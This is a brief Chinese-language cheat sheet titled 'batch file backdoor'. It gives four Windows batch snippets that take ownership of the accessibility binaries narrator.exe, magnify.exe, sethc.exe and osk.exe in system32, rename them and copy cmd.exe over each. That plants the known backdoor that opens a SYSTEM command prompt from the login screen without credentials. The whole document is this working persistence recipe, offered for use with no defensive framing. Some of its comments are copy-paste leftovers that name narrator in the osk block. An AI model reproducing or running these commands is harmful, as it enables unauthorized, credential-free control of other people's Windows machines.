# 批处理文件后门



```bat
cd C:\windows\system32#切换目录
takeown /f narrator.exe#修改narrator的所有者
icacls narrator.exe /grant administrators:F#修改其权限为本机用户
ren narrator.exe  narrator_back.exe#重命名
copy cmd.exe narrator.exe#复制并命名
```

```bat
cd C:\windows\system32#放大镜修改为后门
takeown /f magnify.exe
icacls magnify.exe /grant administrators:F
ren magnify.exe magnify_back.exe
copy cmd.exe magnify.exe
```

```bat
cd C:\windows\system32#shift后门
takeown /f sethc.exe
icacls sethc.exe /grant administrators:F
ren sethc.exe seth1.exe
copy cmd.exe sethc.exe
```

```bat
cd C:\windows\system32#切换目录
takeown /f osk.exe#修改narrator的所有者
icacls osk.exe /grant administrators:F#修改其权限为本机用户
ren osk.exe  osk_back.exe#重命名
copy cmd.exe osk.exe#复制并命名


```

